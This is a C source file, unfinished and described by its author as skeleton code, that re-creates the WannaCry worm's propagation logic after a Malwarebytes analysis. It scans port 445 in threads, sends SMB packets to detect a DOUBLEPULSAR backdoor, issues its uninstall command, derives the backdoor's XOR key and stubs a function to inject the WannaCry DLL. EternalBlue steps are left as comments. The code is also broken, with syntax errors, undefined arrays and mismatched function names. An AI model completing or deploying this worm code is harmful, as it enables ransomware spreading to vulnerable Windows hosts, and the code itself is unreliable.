//https://blog.malwarebytes.com/threat-analysis/2017/05/the-worm-that-spreads-wanacrypt0r/
//skeleton code at this moment
//still a work in progress

unsigned int ComputerDOUBLEPULSARXorKey(unsigned int key)
{
	return 2 * key ^ ((((key >> 16) | key & 0xFF0000) >> 8) | (((key << 16) | key & 0xFF00) << 8));
}

//https://stackoverflow.com/questions/37838490/how-to-properly-set-a-flag-in-the-write-fds-and-select-in-c
int canConnectToPort445(char *ip)
{
	struct sockaddr name;
	struct timeval timeout;
	fd_set writefds;
	SOCKET control_sock;
	u_long argp;
	int result;
	
     	FD_ZERO(&writefds);    

	name.sin_family = AF_INET;
	name.sin_addr.s_addr = inet_addr(ip);
	name.sin_port = htons(445);

	control_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(control_sock == -1)
	{
		result = 0;
	} else {
		ioctlsocket(control_sock, FIONBIO, &argp);
	 	writefds.fd_array[0] = control_sock;
		writefds.fd_count = 1;
		timeout.tv_sec = 1;
    		timeout.tv_usec = 0;
		connect(control_sock, (struct sockaddr*)&name, sizeof(name));
		int ret = select(0, 0, &writefds, 0, &timeout);
		closesocket(control_sock);
		result = ret;
	}
	return result;
}

int IsDOUBLEPULSAR_Present(char *host, int flagUninstall, u_short hostshort)
{
	SOCKET dsock;
	struct sockaddr name;
	char userid[2];
   	char treeid[2];
	char recvbuff[1024];

	name.sin_family = AF_INET;
    	name.sin_addr.s_addr = inet_addr(host);
    	name.sin_port = htons(hostshort);
	dsock = socket(AF_INET, SOCK_STREAM, 0);
	connect(dsock, (struct sockaddr*) &name, sizeof(name));
	
	//send SMB negociate packet
	send(dsock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//send Session Setup AndX request
	send(dsock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy userID from recvbuff @ 32,33
	userid[0] = recvbuff[32];
	userid[1] = recvbuff[33];
	
	//update userID in the tree connect request
    	treeConnectRequest[32] = userid[0];
    	treeConnectRequest[33] = userid[1];
	send(dsock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy treeID from recvbuff @ 28, 29
    	treeid[0] = recvbuff[28];
   	treeid[1] = recvbuff[29];
	
	trans2_session_setup[28] = treeid[0];
        trans2_session_setup[29] = treeid[1]
        trans2_session_setup[32] = userid[0];
        trans2_session_setup[33] = userid[1];

	send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	if (recvbuff[34] == 0x51)
	{
		if ( flagUninstall )
		{
			WORD burn1, burn2, burn3, burn4, burn5;

		    	burn1 = 66;       //update multiplex ID to x42
		    	burn2 = 14;       //burn command - trans2_session_setup[49] = "\x0e"
		    	burn3 = 105;      //burn command - trans2_session_setup[50] = "\x69"
		    	burn4 = 0;        //burn command - trans2_session_setup[51] = "\x00"
		    	burn5 = 0;        //burn command - trans2_session_setup[52] = "\x00"

		    	//modify our trans2 session packet to include the burn command
		    	memcpy(trans2_session_setup + 0x22, (char*)&burn1, 1);
		    	memcpy(trans2_session_setup + 0x31, (char*)&burn2, 1);
		    	memcpy(trans2_session_setup + 0x32, (char*)&burn3, 1);
		    	memcpy(trans2_session_setup + 0x33, (char*)&burn4, 1);
		    	memcpy(trans2_session_setup + 0x34, (char*)&burn5, 1);
			send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
            		recv(dsock, (char*)uninstall_response, 1024, 0);
			closesocket(dsock);
			return 1;
		}
		closesocket(dsock);
	}
	return 0;
}

int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int xkey)
{

}

int runPayloadOnTarget(char *host, u_short hostshort)
{
	unsigned int signature_long;
	unsigned int XorKey;
	SOCKET dsock;
	struct sockaddr name;
	char userid[2];
   	char treeid[2];
	char recvbuff[1024];

	name.sin_family = AF_INET;
    	name.sin_addr.s_addr = inet_addr(host);
    	name.sin_port = htons(hostshort);
	dsock = socket(AF_INET, SOCK_STREAM, 0);
	connect(dsock, (struct sockaddr*) &name, sizeof(name));
	
	//send SMB negociate packet
	send(dsock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//send Session Setup AndX request
	send(dsock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy userID from recvbuff @ 32,33
	userid[0] = recvbuff[32];
	userid[1] = recvbuff[33];
	
	//update userID in the tree connect request
    	treeConnectRequest[32] = userid[0];
    	treeConnectRequest[33] = userid[1];
	send(dsock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy treeID from recvbuff @ 28, 29
    	treeid[0] = recvbuff[28];
   	treeid[1] = recvbuff[29];
	
	trans2_session_setup[28] = treeid[0];
        trans2_session_setup[29] = treeid[1]
        trans2_session_setup[32] = userid[0];
        trans2_session_setup[33] = userid[1];

	send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	unsigned char signature[4];
	if (recvbuff[34] == 0x51)
	{
		ArchitectureType = recvbuff[22];
		
		signature[0] = recvbuff[18];
		signature[1] = recvbuff[19];
		signature[2] = recvbuff[20];
		signature[3] = recvbuff[21];
		memcpy((unsigned int*)&signature_long, (unsigned int*)&signature, sizeof(unsigned int));
		XorKey = ComputeDOUBLEPULSARXorKey(signature_long);
		InjectWannaCryDLLViaDoublePulsarBackdoor(dsock, ArchitectureType, XorKey);
	}
	closesocket(dsock);
	return 0;
}

DWORD MS17_010(DWORD LPPARAM)
{
	lpparam = (struct in_addr) ;
	int attemptCount;
	//CheckMS17Vulnerability here; continue if vulnerable
	if ( tryFirstSetBuffers(&target, 445))
	{
		attemptCount = 0;
		do
		{
			Sleep(3000;
			if ( IsDOUBLEPULSARInstalled(&target, 1, 445) )
			      break;
		      	Sleep(3000);
			//EternalBlue pwn here
		      	trySecondSetBuffers(&target, 445);
		      	++attemptCount;
		 } while ( attemptCount < 5 );
	}
	Sleep(3000);
	if ( IsDOUBLEPULSARInstalled(&target, 1, 445))
	{
		runPayloadOnTarget(&target, 1, 445);
	}
	endthreadex(0);
	return 0;
}
			      
int scanIP(DWORD LPPARAM)
{
	if (canConnectToPort445(target) > 0)
	{
		if( beginthreadex(NULL, MS17_010, (DWORD)LPPARAM, 0, 0) )
		{
			if (WaitForSingleObject(v1, 60000) == 258 ))
			{
				TerminateThread(v2, 0);
      				CloseHandle();
			}
		}
	}
}

int threadMain()
{
	//create 100 threads
	beginthreadex(0, 0, scanIP, v1[i], 0, 0);
}
